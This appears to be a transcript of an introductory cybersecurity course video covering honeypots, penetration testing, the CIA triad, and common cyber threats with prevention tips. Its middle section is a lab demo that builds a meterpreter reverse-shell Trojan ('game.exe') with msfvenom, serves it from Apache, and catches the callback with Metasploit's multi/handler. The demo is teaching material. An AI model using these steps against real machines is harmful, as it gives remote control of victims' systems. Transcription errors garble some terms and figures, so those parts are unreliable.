what is a Honeypot a Honeypot is a decoy
system it is created to Showcase a
certain set of vulnerabilities to try to
attract the attention of an attacker now
the word here is used as lure but it's
more to deceive the attacker for example
if the attacker has been able to bypass
your firewall and your ideas and now can
scan the entire subnet when they scan it
they would come across a device which is
pretty vulnerable or Showcases of
vulnerabilities which would definitely
impress the hacker because they would
think that it is a vulnerable server
which contains some valuable data and
that exactly what Honeypot is it's a
decoy server trying to trying to act as
a production server trying to Showcase
that it has some valuable data but also
has some vulnerabilities in it so that
the attacker can be attracted towards it
and spend some time trying to attack it
or analyze the Honeypot at the same time
the Honeypot when Ally is the data
traffic and it will warn the
administrator of a possible intrusion
which will give the administrator enough
time to secure the rest of the network
and will also get to analyze the logs of
the Honeypot one to try to understand
what kind of attacks the attacker is
trying to create and try to reverse
engineer and identify the attacker at
the same time let's talk about security
testing security testing is nothing but
a method which is carried out to
identify threats and loopholes in a
system so here we are going to do a
vulnerability analyst and penetration
test we will also go ahead and do a
security audit so what is vulnerability
scanning penetration testing and
security auditing vulnerability scanning
is the activity which you are conducting
to identify or look at possible
weaknesses or issues or vulnerabilities
or misconfigurations that exist in your
infrastructure so it is a proactive way
where a team of Security Experts will
launch a vulnerability scanner scan
certain devices that they have
pre-identified and once the report from
the vulnerability scanner comes in try
to analyze the report and make sense out
of it to see if there are any
vulnerabilities that can be identified
on those devices this is obviously an
ongoing process why because operating
systems are patched upgraded new
versions of softwares are released and
we keep on upgrading and we keep on
changing our it infrastructure ever so
often and hence the ID infrastructure
like I say is an Ever evolving process
and to be a priest of all the latest
vulnerabilities and threats we need to
do the vulnerability analysis in an
ongoing manner to identify possible
threats to the organization so then what
is penetration testing vulnerability
analysis is just identifying the
vulnerabilities gaps misconfigurations
that may be in the organization's
infrastructure a penetration test is
basically to validate whether those
vulnerabilities that have been reported
are real if yes how complex are they
what would be the impact and what would
be the technological impact and what
kind of data would be compromised or
what would be the Android result of that
attack if it actually happens in the
real world so here A bunch of ethical
hackers would simulate an attack from a
hacker's perspective or from an
Insider's perspective a malicious
Outsider or a malicious Insider
depending on how they perceive the
vulnerability as and then they will try
to test the vulnerability to see how it
can be exploited to what extent it can
be exploited and what would be the
compromise or what would be the data
leakage that would happen if this
vulnerability gets exploited so there
are three ways a penetration test can be
conducted there is a black box testing a
gray box testing and a white box testing
if you look at back black box testing
this is where the tester or the
penetration tester rather has no
knowledge about the organization their
infrastructure applications or anything
so this is where you're simulating a
hacker who's sitting on the outside who
has no knowledge about the organization
so they start from the information
gathering phase where they are going to
try to figure out the IP addresses the
IP ranges devices operating systems
applications and anything and everything
that the organization is going to use
and then try to figure out
vulnerabilities within them and then try
to attack those vulnerabilities this is
a very time consuming and a cost
consuming audit the second one is that
gray box testing audit where a partial
knowledge is given to the penetration
tester so this simulates a regular user
kind of an attack so let's say if I'm a
regular user in an organization and by
when I say a regular user I'm saying I'm
not an administrator so I have got
limited access and based on that limited
access and The Limited knowledge that I
can gather about the infrastructure by
being a regular employee we are going to
simulate a test with that knowledge to
see whether a employee can take
disadvantage of any vulnerabilities or
and then try to worm their way into the
organization's infrastructure and hack
it the white box testing on the other
hand is where we're looking at an
Insider a malicious Insider who already
has all the accesses who already has all
all the controls in his hand so
simulating and administrative access and
then trying to figure out whether this
administrator can escalate their
Privileges and gain some other
administrators access and try to then
compromise data for example even if I'm
saying I'm an administrator I am not the
only administrator in the organization
there would be backup administrators
there would be system administrators
there would be the active directory
administrators there would be
application administrators database
administrators and so on so forth so
every single component that we have may
have a different administrator for
example switches would have a different
administrator same thing with firewalls
or any other security controls that you
have so if I am a administrator for
backup can I then try to work my way out
escalate my privileges as a regular
administrator or a system administrator
and then crack their passwords try to
get access and manipulate some data so
these are the three types of penetration
testing audits that you will come across
there would be some different subtypes
but every organization can customize
these kind of audits to whatever they
require then we come to security
auditing security auditing is nothing
but an internal check that is carried
out by internal Auditors that means
people who are employees within the
organization to find out flaws in the
organization's information system now
this is more on the compliance side this
may take inputs from the vulnerability
assessment and the penetration test but
overall we want to see what kind of
policies that we have in our
organization whether those policies are
working properly whether they make sense
are there any gaps and based on the
technical inputs from the vapt team how
do we map with the policies that we have
defined for that Organization for
example a password policy now we have
documented that the password policy
should be effective enough that
passwords cannot be easily brute forced
so that's a high level policy then we
dictate a procedure for that policy to
be implemented where we say hey we want
the systems to be configured where the
password meets some complexity stand
standards for example should be
uppercase and lowercase A through Z 0
through 9 should use special characters
and should be randomized password should
not be dictionary based or based on the
user's name now these are this is the
policy that we have created and the
procedures that we have defined are they
being actually implemented in the real
world so a vulnerability analysis would
determine whether the passwords are
probably weak or not so if the
vulnerability report comes back and says
the passwords are probably weak then a
penetration tester would go in and then
try various attacks to see if passwords
can be compromised now first and
foremost what is cyber security there
are three main pillars of cyber security
that we deal with since the Inception of
computers and they're known as the
confidentiality integrity and
availability Triad also known as CIA not
to be confused with the American
intelligence agency but here we're
looking at three different pillars where
we want our data to remain confidential
the Integrity of the data to be intact
and the data to be made available at all
points in time AI so let's talk about
these three aspects the principle of
confidentiality asserts that the
information and functions can be
accessed only by authorized parties so
for example even if your password
protect your file what is it that you're
trying to do you're trying to prevent
other users accessing your data and
peeping into your files so that your
data remains confidential it is only
shared with people who know the password
Integrity this is where the
trustworthiness of that data comes into
the picture where if the data is going
to be changed for example you have a
spreadsheet which has a lot of
information about users and their login
activities and whatnot and you want to
ensure that that data is not modified by
any unauthorized user so you're going to
verify that the information is correct
and is not modified by anybody who's
unauthorized the availability part
ensures that this data is made available
to all authorized users when and where
they want it right the principles of
availability assert that in systems
functions and data must be available on
demand according to agreed upon
parameters based on levels of service
now this is where your service level
agreements would come in for example
when we log on to Gmail we always assume
that Gmail is going to work and it's
going to be available online at no point
in time or very few times has it ever
occurred that you have gone on to the
internet type in gmail.com and the
website is not available in fact if the
website doesn't open we figure out the
internet is not working right but Gmail
as a service is always made available
now when we talk about threats to CIA
the confidentiality integrity and
availability we talk about them in two
different parameters cybercrime and
hacking so what is cyber crime cyber
crime is any criminal activity or any
unauthorized activity that would involve
the usage of any Computing device which
would result as a security incident at
the victim's end most cyber crimes are
carried out in order to profit from them
Criminal would try to do phishing
attacks to steal your money out of your
bank accounts or who try to con you into
giving out your credentials thus
compromising your email accounts or your
social media accounts and try to gain
access to your identity cyber crimes are
generally carried out against computers
or devices directly to damage or disable
them spread malware secret steal secret
information
Etc so this talks about the motivation
part of cyber crimes what would be the
motivational aspect for a person to
conduct such an activity right so
basically to cause damage like Wanna Cry
happened in 2017 the perpetrators those
those used one archive probably gained a
lot in the ransom that they demanded for
that data to be decrypted but it also
caused the world lot of money in profits
that were lost right let's move on to
titling cyber crime so what what do we
mean by cyber crime now again if you
remember a few slides back a few topics
back we talked about information
security and we talked about cyber
security and we talked about the
difference between both of them
information security could be about
anything normally contained within the
organization the data that the
organization has and US securing those
data by introducing the security
controls that we talked about cyber
security would be something that is on
the Internet or on the web so any web
application that have deployed on the
internet any databases that I have that
would talk about cyber security so if
your Facebook account gets hacked or
your OneDrive gets hacked that's where
cyber security comes into the picture
but if your physical computer gets
hacked because your password got cracked
by a physical attack that's where your
information security is so some of the
basic ways of preventing cyber attacks
on us use unique and strong passwords
we've just discussed the complexity of
the passwords we want to keep them
random they should not be guessable they
should not be based on dictionary words
and they should be randomized in such a
way that they cannot be predicted or
guessed the length of the password
should be very good should at least
least the minimum bare minimum should be
eight characters even that is not
suggested in today's world it has to be
at least 12 to 16 characters an
operating system I think in today's
world will support up to 24 or 26
characters if you go into encryption
softwares that support up to 60 odd
characters of passwords so you want to
keep those unique you want to recycle
those passwords on a regular basis you
do not want to reuse old passwords again
and again avoid public Wi-Fi that's a
must we always look for free Wi-Fi we go
to coffee shops because the advertise
free Wi-Fi that's now it nowadays A
Unique selling point uh for uh coffee
shops and establishments and we go there
we connect to the Wi-Fi because we get
free internet and we get to serve
whatever we want the problem is we have
no idea who else is connected to that
Wi-Fi and what kind of attacks they are
creating we would discuss Wi-Fi attacks
later on in one of the later videos
where I can demonstrate how these
attacks work but for now just remember
that public Wi-Fi's are very risky and
and if your security is not up to the
mark you might just end up getting
hacked like nobody's business ignore and
delete mails from unknown senders
phishing attacks very common attacks in
today's world you get an email uh saying
you've won a lottery or you've been
chosen for something or please don't
click here to download your free
software and something like that and
those emails are plenty nowadays I
received an email yesterday where there
was a Nigerian prince uh who had died
and he had left around 500 million
dollars behind and there was this
accountant who wanted to smuggle that
money out and it was a huge email giving
me all the details and out of 7 billion
people on this planet they identified my
email address and they wanted to share
half the money with me so that they can
masquerade the money and avoid paying
taxes inheritance taxes and whatnot it
was a ridiculous scheme I mean being
chosen out of 7 billion one out of 7
billion I mean our luck can't be that
good can it so you have to be wary about
these attacks always ask the question if
you want a lottery did you purchase the
ticket no so there's never a free lunch
right so always keep on questioning the
things that you've been getting I'm not
saying ignore them because some of them
may actually come true there's always
that one percent hope but always
investigate those things to see whether
they are spam if there is a fraud going
on and if yes you yourself can
communicate with the law enforcement
agency and try to figure out uh who is
responsible for that fraud make use of
antivirus software and always keep it
updated again uh let's not go for the
free antivirus softwares because they
have they may be good at detecting
infections but when they come for the
disinfecting those files then that's
where they ask for money and that's when
you're going to run around and say okay
let me see which is the which is a very
good antivirus to disinfect this kind of
a infection so uh there are a lot of
antiviruses out there I know that and
it's very confusing which is the best
one today now the problem is whichever
is the best one in the market when not
be the best one for the operating system
that you're using for example I mean
some there would be a good Antivirus for
Windows 7 but the same antivirus
installed on Windows 8 or Windows 10
wouldn't be that effective so always do
an investigation the best way to look at
antiviruses and identifying which
antivirus suits you is to investigate
that antivirus and see the detection
rate of that antivirus see how often
does it detect uh the infections that
you're looking at what you can do is you
can head on to a website called
virustotal.com that's v i r u s t o t a
l.com it's a Google owned website they
have around 60 to 70 odd scanners on
that website most of the known antivirus
scanners are there try to figure out uh
try to see if you can get hold of an
infected file be very careful you don't
want to get infected yourself or I mean
your computer you can upload it to that
particular website and analyze that file
and see which uh antivirus detects those
kind of viruses a few files a few
infections over here and there and you
will come to know which antiviruses
would work for you use multi-factor
authentication or two-step processes for
authentication just don't rely on a
username and password register devices
get otps either on your email or on your
devices that gives you an added layer of
security if your password gets
compromised that's still okay because
now the hacker will need to simulate
your phone as well so that's added uh
headaches and it may just not be worth
it there are so many other people who
don't use this kind of techniques work
who can be hacked much easily than
people who have an added layer of
security introduced and be very careful
when you're downloading apps now when we
say applications on your mobile phones
as well as in your computers on your
mobile phone you still have a certain
level of security where you can go to
the Apple Marketplace or whatever it is
called the Google marketplace or
whatever it is called and they do have
some level of control but when you talk
about Windows operating systems and
you're going on to the open internet to
look for different kinds of softwares
you have no idea whether the website
that you're on is trustworthy or is
hosted by a hacker with a malware on
that particular file that you're
downloading especially if you're
downloading a pirated program never
download a pirated program so be very
careful when you are downloading apps uh
when you're downloading an executable
file you can upload it to virus
total.exe scan it to see if there are
any viruses or malwares within it the
website also helps you analyze URLs to
see if the URL itself may have any
malicious attacks within them embedded
scripts or redirected scripts or things
like that so you can use those that
website to scan scan the apps that
you're downloading and see if there is
anything malicious about those apps
moving on to cyber crime statistics now
this is going to be interesting let's
talk about how these things and the
percentile of these things in today's
world by 2020 we would have generated
300 billion passwords now the human
population on this planet is 7 billion
Imagine 7 billion having 300 billion
passwords and I think half half the
population wouldn't have access to
computers or the internet either so
imagine the number of passwords that we
have and that's what makes us use Easy
passwords makes us repeat those
passwords and makes and we use a single
password for multiple accounts right
because there are just so many passwords
that we have to remember but that's the
way it is and if we want to keep
ourselves secure we are responsible for
it so please be very careful with those
passwords 24 000 malicious mobile apps
blocked daily in fact the latest example
that I can give give you I use an
Android phone and there's an application
that I've always used called cam scanner
and recently just three days back my
mobile phone started telling me that it
is a malicious app right I've been using
it for years now probably three or four
years maybe more what is the software
you can click pictures of a document it
will automatically convert it it will uh
it will beautify it if that's a word
convert it into a PDF and I can then
send it as an attachment via email a
very handy app for me or was an handy
app for me it worked beautifully but
three days back suddenly the Android
operating system and my antivirus on my
uh Android phone started reporting it as
a malicious software so I went online
and I checked into it and it seemed that
over a period of time the developers
changed their vision of that software
made it spyware and then there was a
dropper involved within that application
which would then download a malware from
a third-party server install it and
start spying on you and start showing
you malicious advertisements right so
this was an existing app which was
trusted over a period of years and over
a period of time slowly they modified it
into a spyware Casper's key was an
organization that detected it in the
first place and then pointed it out to
Google Google took it off the Google
Play Market and now there is a variant
of it available but if you look at the
reviews all of them are one Stars where
they have identified that this is a
malware now and it spies on them and it
actually compromise some people's data
so that's the latest example in 2017 or
18 there was 700 000 apps during that
year that were identified by Google as
malicious apps and we deleted from
Google Play so even if they're published
there will be thousands of people who
will download it till the time Google
realizes that it is a malware and then
deletes it till then you've already been
compromised and there is no way to
protect yourself now so be very careful
when you download these applications in
the healthcare sector ransomware attacks
will quadruple now the healthcare sector
is a very volatile sector it contains a
lot of private and sensitive information
health information about individuals
that can be misused by a lot of
organizations advertisements
pharmaceutical organizations life
insurance people and whatnot right so
these became very lucrative targets for
hackers where if they can steal the
database and sell it on the black market
they will earn a lot of money ransomware
would basically really work the other
way around the encrypt the data at the
hospital side and then they will hold
the hospital Ransom to pay up now you
know how hospitals earn nowadays right
so that's a lot of money that you're
looking at cyber crime would cost up to
six trillion dollars in 2021 6 trillion
dollars just for cyber crime we are not
talking about the income from the IIT
industry we are talking about how much
money we will lose to cyber crime
because of the various attacks that we
that would be created ninety percent of
hackers use encryption not only
encryption most of the advanced hackers
will try to hide their identity by
spoofing their IP addresses Mac
addresses locations they will use
encryption and cryptography to hide
their malicious softwares to fool the
anti-viruses idss ips's and it would it
is a very difficult task to even
identify a particular malware analyze it
and then do a root cause analysis and
try to figure out who the responsible
hacker was so it's a very intensive task
of doing so such things and most of the
hackers would go to Scot free because it
is very difficult to identify them now
let's move on to the demo it's a very
interesting demo we are using Metasploit
which is a penetration testing tool and
we are going to use a demo of using
Metasploit we are going to try to
compromise the security of a particular
system well let's discuss the demo
before we start executing it so what we
have done here is that we have two
virtual machines on VMware Workstation
one is the Kali Linux machine and the
other is a Windows 7 machine what we are
going to do is we are going to use a
penetration testing tool called
Metasploit which is available freely on
Kali Linux and we are going to use a
particular payload generator on
Metasploit called msfv Venom and using
msf Venom we are going to create a back
door a executable file which will
contain a Trojan or a backdoor and
you're going to try to infect that to
the Windows machine and see what happens
when the victim executes that particular
file now we are going to keep it at the
basic level we're just going to create
the Trojan and then we are going to
execute it in a later lecture or in a
later video we'll see how we can mask
that Trojan into a legitimate looking
application so that a victim can be
fooled by the application that we're
going to execute so let's start with the
demo all right so this is the Kali Linux
VM and the other machine is a Windows 7
virtual machine so what we are going to
do is on the Kali Linux machine we are
going to just open up a command prompt
right it's just regular command prompt
regular commands and what we're going to
do is we are going to use the msf Venom
payload generator from metasploy to
create a game.exe file now the Trojan is
will be contained within the game.exe so
the command goes as such msf Venom
hyphen P for platform we want it or
rather payload at this point in time we
want the payload to be Windows meet
operator reverse underscore TCP L host
and the IP address for the localhost
I'll explain the command once I have
typed it let's just check what our IP
address for this machine is and we have
192.168.71.133 and that's what we're
going to type in here 192 168
71.133 L Port 4444 hyphen f exe hyphen a
x 86 and we want that output in root
desktop and we want it as game.exe so
let's go through the command the msf
Venom is the initiator command it
invokes the payload generator in
Metasploit hyphen p is the payload we
want Windows metoprito reverse TCP so
what is a reverse TCP here the meter
printer allows us for remote code
execution where we are going to create
the payload we are going to execute the
payload at the victims and and the
payload will then generate a connection
back to us us bring the hackers machine
and thus the loop host which is the IP
address of this machine which is the
hackers machine that you are using right
now which is
192.168.71.133 that's why we have typed
in the local host and lport is the local
port on which Port do we want to listen
in or we want the payload to connect to
the Local Host so what we're doing is
the meter printer allows us remote code
execution we create the game.exe we
execute it at the victim's end it is
pre-coded to connect to a local host the
IP address is coded over there to a
particular Port which in this case is
444 you can put in any port number you
want just ensure that the port is going
to be free and it is not a regularly
used Port otherwise you're going to get
problems over there so at this point in
time you're going to keep it as four
four four hyphen f stands for function
view what an executable file hyphen a
stands for the architecture here the
architecture is 886 which is x86 which
is 32-bit and we are going to export it
and we are going to host it or if you're
going to create the file on root desktop
and we are logged in as root as you can
see at the prompt so when I press enter
I should see a game.exe popping up right
about here on my desktop if the command
is correct which it should be and that's
game.exe wait for it to be compiled
properly so there you can see platform
windows for payload no encoder a payload
size 33 333 bytes and final size of
executable file is 73 800 and 0 802
bytes so now we have created game.exe
now we are not going to convert this
into or we are not going to merge this
into a malware and things like that
we're going to keep it simple so to keep
it simple what I'm going to do is as a
hacker I'm going to host this on a
server which is going to be on this same
machine right so when we say we want to
host on Apache server the server is
hosted in a directory called slash VAR
slash www so let's go there present
working directory uh we can see that we
are in group
and there we are cdhtml and that is
where our web servers would be so what
we are going to do is we are going to
create a directory mkdir shared right to
an LS and you can see the shared folder
right here LS hyphen Al will give you
the list and the attributes and we can
see these attributes we want to change
these attribute so we are going to use a
chmod recursive command give the
permissions as 755 to the folder shared
since you are in the same directory we
do not need to give the path for shared
let's just verify it and you can see the
permissions being changed and now what
we are going to do is we are going to
change the ownership from root to www
hyphen data for the web hosting so CH
own for change ownership recursive
hyphen data cooling www.hyphen data to
Shared all right let's check if that's
been done properly and you can see that
earlier it was root root and now it is
hyphen data right and so that's the
directory that's that we have created
let's go back uh what we want to do is
we want to copy game.exe into this
folder so CP root desktop game.exe wire
HTML shared and CD shared Let's see we
have game.exe right there there it is
and now what we want to do is service
Apache to start so essentially what we
have done is we have created a directory
in the HTML folder to host this file and
we've copied it from our desktop into
the shared folder and I'm going to pause
here for a minute all right so we have
started the service for the Apache 2
server that means we have started the
web server we have hosted the game.exe
on the web server in the shared folder
we have changed the permissions and the
ownership for the shared folder now we
are going to go on to the Windows 7
machine and we are going to open up the
browser and see if the web server is now
accessible so if you remember the IP
address of that machine was
192.168.71.133 and we have we were in
the shared folder 92 168
71.133 shared and if this is done
properly we should see the game.exe
right here and once we click on it it's
going to ask us whether we want to save
the file 72.1 KB we're going to save it
and I'm going to save it on I think it
just saved it here and now before we
execute it we are going to go back into
Kali line next and we are now going to
start the listener right so we've
created the exploit you've created the
payload rather we have hosted it onto a
web server which means that when
somebody double clicks on it the machine
is going to try to create a reverse
connection to our Hacker's machine but
our hackers machine needs to be
configured to handle that incoming
connection so we are going to start off
with msf console now msf console is the
command which starts up Metasploit right
so we're just going to take a minute
over here you can see it's meta slide
framework control it's going to start
it's uh does take a little bit of a
while and we're just going to wait it
out let me turn this into full screen I
can see at the bottom left you're on msf
on the msf prompt we are using
Metasploit with
1699x plus now this is not a completely
updated version the latest one would
have around 1800 exploits but the one
that we want is uh exists in this
version so that we are good to go so we
start off with the configuration of
Metasploit to listen in onto that
particular connection so we say use
exploit multi Handler and when you say
multi multi is basically something that
affects multiple operating system and
we're going to use that exploit and you
can see uh it's now opening up the
Handler which we need to configure and
here we're going to set the preload that
it is going to expect the payload being
Windows meter preter reverse underscore
TCP you can see that the payload has
been configured we are going to say show
options and you'll see it is going to
ask us options uh for the payload which
means the localhost the listen address
and the listen Port now you can see we
had by default given 4444 which is the
default port for this exploit within
Metasploit if you want to change if you
have changed the port when you created
game.exe you need to change the port
over here as well and the command ones
here that says set L host equals
192.168.71.133 enter and I think I did a
typo so uh there's no equal to that's it
and you can see now it shows the equal
to Mark and we have now set the Local
Host if we want to set the L Port that's
how we do it we had 4444 and there it is
so if you have changed the port in the
game.exe and show that you change the
port here as well show options and
you'll see now the data is populated
over here L host which is a local host
is
192.168.71.133 and L Port the local Port
is 4444 we have configured this and now
what we are going to do is we're just
going to type in exploit and now you can
see that it has started the reverse TCP
Handler on 190 to 160 at 71.133 on Port
4444 so now when the victim which is
Windows 7 executes the file and we say
run at the victim's end there's nothing
that should happen it's just resolving
something and at the other end you can
see that a metabolitization has been
opened and it shows us that from the
victim's IP which is 71.129 on Port
49493 we are connected to our machine so
that's that's the connection that has
happened press enter and you can see it
exists exits the session let's just look
at the IP address on Windows to confirm
that was the same machine that we had
and that's 129 right there it is uh
let's open up this file again and see
what happens and you can see the second
session being opened up right here to a
PWD and you can see that we were
connected to that particular website
right so that's what uh this Trojans are
supposed to do give us a back door entry
and we then are able to connect and we
are able to to copy data and we are able
to basically we have a back door so we
can do anything and everything that we
want to do
just like how the code 19 situation is
affecting various domains it is also
adversely affecting cyber security
Interpol states that attackers are
attacking computer networks and systems
of businesses individuals and big Global
organizations
due to the shift of focus to the kovit
crisis cyber security is taking a huge
Brunt
even who has stated that from the
beginning of this pandemic it has
witnessed a sky-high increase in the
number of cyber attacks there are fake
emails doing the rounds in which
scammers are impersonating who
reports also state that the financial
services sector is increasingly being
targeted during the covid-19 coronavirus
pandemic
various Banks and financial institutions
have witnessed a spike in the number of
cyber attacks in the last few months
several banks are increasing Cyber
attack awareness amongst their customers
and also asking them not to disclose any
confidential information to a third
party now that we have an idea as to how
cyber attacks can affect us let's go
ahead and understand the meaning of a
cyber threat
a cyber threat is a warning which allows
you to prepare against a Cyber attack
when there is an unauthorized access by
a third party to your system and network
it is termed as a Cyber attack the
person who carries this out is termed as
a hacker or an attacker or a cyber
Criminal
a possibility of such an attack is
termed as a cyber threat
as we saw previously cyber attacks lead
to data breaches which result in either
data manipulation or loss of Highly
confidential data
it also results in financial losses and
which in turn has a colossal impact on
the businesses
in addition to these losses a lot of
companies face reputational damages as
well trust plays a vital role when it
comes to customer relationships cyber
attacks can hamper an organization's
reputation and erode the customers Trust
let's now get an understanding of the
most common cyber attacks here we will
look into the top 10 cyber threats in
today's Times
first up we have the malware attack
this is a very common form of Cyber
attack the term malware refers to
malicious software virus including
spyware worms ransomware adware and
Trojans
trojan virus is a form of malware that
disguises itself as a legitimate
software ransomware blocks access to the
key components of the network whereas by
where as the name suggests is a software
that steals your confidential data
without your knowledge
coming to adware it is also a software
but this software displays advertising
contents such as banners or pop-ups on a
user screen
mother breaches a network through a
vulnerability it usually happens when
the victim clicks a dangerous link or
downloads an email attachment or also
when an infected pendrive is used
let's now have a look at the ways in
which we can prevent a malware attack
first and foremost you should use any
kind of an antivirus software this step
might be something that you have heard
time and again but it is a very
effective way to prevent a malware
attack
antivirus software is a program that can
protect your computer against the above
mentioned viruses
does data security utility installed in
a computer can prevent a malware attack
few of the popular antivirus software
are Avast antivirus not an antivirus and
McAfee Antivirus
secondly you should use firewalls a
firewall helps prevent an unauthorized
taxes viruses and other malicious
activities that occur over the internet
as the name suggests it acts as a one
between your system and the internet
it filters a traffic that is allowed to
enter your device
Windows and Mac OS 10 have their default
built-in firewalls named as Windows
Firewall and Mac firewall respectively
apart from this in order to prevent
attacks on your network your router
should also have a firewall built-in
thirdly you should always stay alert and
avoid clicking on suspicious links the
links might look to be legitimate but
they can be home to malware which is
going to enter your system and cause a
havoc
lastly it is wise to update operating
systems and browsers regularly if this
is not done cyber criminals can exploit
these vulnerabilities and attack your
system that was all about preventing a
malware attack
let's move on to the next attack it is
the phishing attack
it is one of the biggest widespread
types of cyber attacks as per reports
phishing accounts for over 12 billion
dollars in business losses so what is a
phishing attack
it is an attack wherein an attacker
impersonates to be a trusted contact and
sends the victim fake emails
unaware of this the victim opens the
email and clicks on the malicious link
or opens the attachment in the mail
the aim of such an attack is to gain
access to confidential information and
account credentials
hackers can also install malware through
a phishing attack this attack is growing
bigger each day as attackers are
becoming more convincing and pretending
to be a trusted source
for example you might get an email from
Apple stating that your Apple account is
kept on hold for security reasons and
the mail will ask you to type in your
login credentials in order to restore
your account
do not fall for that as it is a phishing
email legitimate sources will not
randomly send you mails and ask for your
account credentials
phishing is a type of social engineering
attack social engineering attacks refer
to several malicious activities that are
obtained through human interactions
it manipulates the victim in such a way
that he or she ends up divulging
personal information
such an attack can happen on any
platform such as text messages or even
on social media sites
similar to phishing you also have voice
fishing known as wishing wishing will be
carried out over a voice email or mobile
phone or even over landlines
so how do we prevent a phishing attack
human error is the reason for a high
percentage of cyber attacks to prevent a
phishing attack the wisest way they'll
be to scrutinize the emails you receive
our phishing email will have some
spelling mistakes or a format change
from that of the legitimate Source it is
pretending to come from
look for these loopholes and do not
click any sub suspicious emails
next you can also make use of an
anti-fishing toolbar sometimes when it
is impossible to identify a phishing
email this toolbar is helpful it is a
tool that provides you with anti-fishing
Solutions and information about the
website you are browsing
they prevent fraudulent websites from
Mass grading as other legitimate
websites for example Avast online
security is a good anti-fishing toolbar
you can get
you should also make it a habit to
update your passwords regularly this way
even if your own password don't do a
third party it will still be invalid
let's now move on to the next type of
Cyber attack that is the password attack
this is a form of attack most of us
might have experienced at some point in
time imagine when you try to log into an
account and it says incorrect password
in such a scenario it is possible that
an outsider has managed to either guess
or steal your password
by doing so all your data is compromised
a hacker can track your password with
the help of various programs and
password tracking tools like aircrack
can enable John Ripper hashcat and so on
there are different types of password
attacks a Brute Force attack happens
when the hacker tries to log in with all
possible password combinations meanwhile
in the dictionary attack a list of
common passwords is used to crack the
user's login credentials
next is a key Locker attack keystroke
locking records the keys struck on a
keyboard by the wicked and the victim is
totally ignorant of this this key logger
or a keystroke recorder can either be a
hardware or a software
speaking of how one can prevent password
attacks it is crucial that you use
alphanumeric passwords which are strong
incorporate special characters in your
passwords as well it is to be noted that
you shouldn't be using the same password
for multiple websites or accounts also
make sure to not use easily guessable
passwords which includes your name or
your family members names or even your
date of birth
needless to say update your passwords
regularly this will limit your exposure
to a password attack
the next tip is something we should all
be careful about often we make
complicated passwords and to remember
then we mot a dance somewhere or keep
them short of a password hint in the
open this shouldn't be done in the open
as this can prove to be a gateway to an
attack as a third party can misuse your
account with the help of your password
hint
let's now move on and have a look at the
fourth type of Cyber attack on our list
that is the man in the middle attack
as you can see on your screens we have
the client on the left the server on the
right and the hacker below
and now you can see that the clients of
a communication has been cut off
and instead the communication line now
goes through the hacker
so let's elaborate on this
man in the middle attack is also known
as eavesdropping attack it takes place
when an attacker comes in between a
two-party communication
in other words the attacker hijacks a
session between a client and host
so what do they gain by interrupting the
session well they're able to steal and
also filter data imagine you are logging
into your bank account in such a state a
man in the middle attack can be used to
obtain information related to your bank
account
let's now have a look at how we can
prevent man in the middle attack
firstly you should be aware of the
security of the website you are using
and it is advised to use encryption on
all devices that contain crucial data
using an unsecure public Wi-Fi can help
attackers carry out the man in the
middle attack hence it is suggested that
you avoid using public Wi-Fi's to carry
out important work
next attack that we will be talking
about is the SQL injection attack
a structured query language SQL
injection occurs in a database driven
website when the hacker manipulates a
standard SQL query
this attack can be carried out by
submitting a malicious score into a
vulnerable website search box thereby
making the server reveal information
the outcome of this attack is that the
attacker is able to view edit and delete
tables in the databases in addition to
this the attackers can also obtain
administrative rights
an SQL attack manipulates data and
accesses confidential information
in order to prevent a SQL injection
attack you should use an intrusion
detection system and IDs is designed to
detect unauthorized taxes to a system
it is used together with a firewall and
a router this way unwanted requests can
be filtered out
the next step is to carry out a
validation of the user Supply data there
are codes that are developed to identify
illegal user inputs the validation
process helps in verifying whether or
not the type of user input is allowed or
not
this way only that value which passes
the validation will be processed
that was all about the SQL injection
attack
so now that we have reached Midway I'd
like to remind you all to feel free to
leave your questions in our chat section
and we will be happy to answer them
without further Ado let's go back to our
list of the top cyber security threats
at number six we have the denial service
attack
this is a type of attack that proves to
be a major threat to companies in this
attack malicious party's Target systems
servers or networks and then flood them
with traffic so as to exhaust their
resources and bandwidth
as a result the server is unable to
handle incoming requests and thereby
resulting in the website it holds to
either slow down or shut down
this leaves legitimate service requests
unattended it is known as distributed
denial of service DDOS when attackers
use multiple compromise systems to
launch this attack like I mentioned
earlier the DDOS attack is a major
threat to organizations let's have a
look at one such detos attack
in February 2018 the famous United
states-based global company GitHub
revealed that it was hit with the
distributor denial of service attack
DDOS attack
this DDOS attack is considered to be the
world's largest DDOS attack as you might
be aware GitHub is a developer platform
used by millions all over the world
hence it always has high traffic and
usage but this time it was in just high
traffic but a whopping 1.35 terabits per
second sending packets at a rate of
126.9 million per second
these figures speak for itself
fortunately GitHub is running a DDOS
Protection Service which was
automatically alerted within 10 minutes
of the start of the attack
this attack only two GitHub systems down
for about 15 to 20 minutes GitHub was
able to stop the attack quickly only
because it utilized the detox mitigation
service that helped in detecting the
attack and which further helped in
quickly taking the necessary steps to
minimize the impact
let's now have a look at how to prevent
a DDOS attack
firstly to stop Adidas attack you're
required to identify the malicious
traffic this can be made possible by
running a traffic analysis also remember
to comprehend the warning signs few
symptoms of Adidas attack include
Network slowdown intermittent website
shutdowns Etc
if anything seems irregular and unusual
then the organization should do the
needful
secondly understand that every
organization can face a DDOS attack and
be ready with a prevention plan as there
won't be any time to prepare one when it
hits
for this purpose develop an incident
response plan have a checklist and make
sure your team and data center is
prepared if you are well prepared you
can tackle a DDOS attack smoothly like
how GitHub did
lastly the conventional DDOS mitigation
Solutions oversize the network bandwidth
and require complex Hardware which
proves to be costly and also ineffective
whereas cloud has greater bandwidth and
resources it is also to be noted that
cloud-based apps can absorb malicious
traffic way before it reaches its
intended destination
hence it is good to Outsource DDOS
prevention to cloud-based service
providers that was all about the DDOS
attack
now let's look at number seven and here
we have The Insider threat
and inside our threat as the name
suggests is one that does not involve a
third-party button Insider it could be
someone from the organization who knows
everything about the organization it
could be current employees former
employees contractors or even Associates
these threats have the potential to
cause huge damages
researchers show that Insider threats
are growing in small businesses as
employees have access to multiple
accounts that have a lot of data
the individuals who misuse this data can
put everyone else at risk
reasons for such security breaches are
many it can be due to malice greed or
even carelessness
such a threat is quite tricky as these
attacks are hard to predict
in order to prevent The Insider threat
attack thorough preparation is required
organizations should make sure that they
have a good culture of security
awareness businesses can limit the I.T
resources a user can have access to
depending on their job rules this way
the damage if cost can be minimized
all the employees should be trained to
identify Insider threats and This Way
employees can understand when an
attacker has manipulated or is
attempting to misuse the company data
next up in our list is crypto jacking
which is at number eight
I'm sure most of you are aware of the
word cryptocurrency crypto checking is
related to cryptocurrency you must be
wondering how let's understand what is
crypto jacking
